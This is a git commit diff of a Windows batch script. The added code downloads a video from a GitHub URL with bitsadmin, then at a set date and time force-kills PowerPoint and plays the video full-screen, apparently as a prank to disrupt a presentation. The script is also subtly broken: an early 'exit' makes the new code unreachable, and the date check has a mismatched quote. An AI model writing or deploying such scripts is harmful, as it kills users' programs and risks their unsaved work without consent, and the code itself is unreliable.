59cf48e2cbc5d557ec984f1eb79722a912c3e3e0
similartobash <120057329+similartobash@users.noreply.github.com>
2022-12-14 01:13:04 +0300

    Update main.bat

--- main.bat
+++ main.bat
@@ -1,15 +1,22 @@
 @echo off
-rem echo + > "%USERPROFILE%\Desktop\Yeni Metin Belgesi.txt"
 
-if exist "%USERPROFILE%\Desktop\Yeni Metin Belgesi.txt" (
-mkdir "%USERPROFILE%\Desktop\esc0"
-mkdir "%USERPROFILE%\Desktop\esc1"
-mkdir "%USERPROFILE%\Desktop\esc2"
-mkdir "%USERPROFILE%\Desktop\esc3"
-mkdir "%USERPROFILE%\Desktop\esc4"
-mkdir "%USERPROFILE%\Desktop\esc5"
-mkdir "%USERPROFILE%\Desktop\esc6"
-mkdir "%USERPROFILE%\Desktop\esc7"
+exit
+
+if not exist "%TEMP%\ataturk.mp4" (
+bitsadmin /transfer vidjob /download /priority high "https://raw.githubusercontent.com/similartobash/rc/main/video.mp4" "%TEMP%\ataturk.mp4"
+)
+
+if "%date% == "Çar 14.12.2022" (
+:timeloop
+if "%time:0,5%" == " 9:50" (
+taskkill /f /im POWERPNT.EXE
+set video2play="%TEMP%\ataturk.mp4"
+set wmplayer="%ProgramFiles(x86)%\Windows Media Player\wmplayer.exe" /prefetch:1
+%wmplayer% %video2play% /fullscreen
+) else (
+timeout /t 10
+goto :timeloop
+)
 )
 
 exit
